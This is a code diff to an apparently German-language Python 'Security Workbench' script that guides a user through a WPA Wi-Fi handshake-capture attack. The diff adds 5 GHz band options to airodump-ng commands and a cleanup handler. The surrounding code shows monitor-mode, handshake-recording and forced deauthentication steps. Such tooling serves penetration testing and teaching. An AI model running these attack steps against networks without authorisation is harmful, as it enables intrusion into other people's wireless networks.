@@ -10,6 +10,8 @@ import colors
 import generics
 from generics import rlinput,execute,clearScreen,showCAPfiles,deauthClients
 
+used_interface=''
+
 def WPA_Menu():
 	attack = True
 	while(attack==True):
@@ -30,15 +32,23 @@ def WPA_Menu():
 
 		#MONITOR MODE
 		generics.monitor_mode(wifi_name)
+		used_interface=wifi_name
+
 		
 		#KILL PROCESSES
 		generics.kill_wifi_proc()
 
 		#STEP 1 Check again
 		wifi_name = generics.check_wifi_name(wifi_name)
+		used_interface=wifi_name
+
+		do5GHZ = generics.Is5GHz()
+		str5ghz = ""
+		if(do5GHZ):
+			str5ghz = " --band a "
 		
 		#STEP 2
-		command = rlinput('Die BSSID und Kanalnummer ermitteln (Netzwerk anhand der SSID indentifzieren): \n# ', 'airodump-ng ' +wifi_name )
+		command = rlinput('Die BSSID und Kanalnummer ermitteln (Netzwerk anhand der SSID indentifzieren): \n# ', 'airodump-ng '+str5ghz +wifi_name )
 		execute(command)
 		router_ssid = raw_input("Bitte die Netzwerk SSID angeben: ")
 		router_chn = raw_input("Bitte die Netzwerk Kanalnummer angeben: ")
@@ -57,11 +67,15 @@ def WPA_Menu():
 		print('SSID: ' + router_ssid)
 		print('Kanalnummer: ' + router_chn)
 		print('BSSID: ' + router_bssid)
+		if(do5GHZ):
+			print('Band: 5GHz')
+		else:
+			print('Band: 2.4GHz')
 		print("\n")
 
 		#RECORD TRAFFIC
 		print("Jetzt erst beginnt der tatsächliche Angriff:")
-		command = rlinput('Aufnahme des Netzwerkverkehrs bis ein vollständiger 4-way-handshake aufgenommen wurde (Liegt der Handshake vor kann der Prozess beendet werden.): \n# ' ,'airodump-ng -c ' +router_chn + ' --bssid ' + router_bssid +' --showack -w '+ router_ssid + ' ' + wifi_name )
+		command = rlinput('Aufnahme des Netzwerkverkehrs bis ein vollständiger 4-way-handshake aufgenommen wurde (Liegt der Handshake vor kann der Prozess beendet werden.): \n# ' ,'airodump-ng -c ' +router_chn +str5ghz+ ' --bssid ' + router_bssid +' --showack -w '+ router_ssid + ' ' + wifi_name )
 		execute(command)
 
 		#FORCE REAUTH
@@ -128,5 +142,13 @@ def WPA_Menu():
 		else: 
 			attack = False
 			return False
+
+def sql_signal_handler(signal, frame):
+	#Stop Monitor Mode
+	os.system('airmon-ng stop ' + used_interface)
+	#ReStart Networkmanager
+	os.system("service network-manager restart")
+	print('\n\n Die Security Workbench wird beendet ... \n')
+	sys.exit(0)
 
 	#FINISHED WPA ATTACK
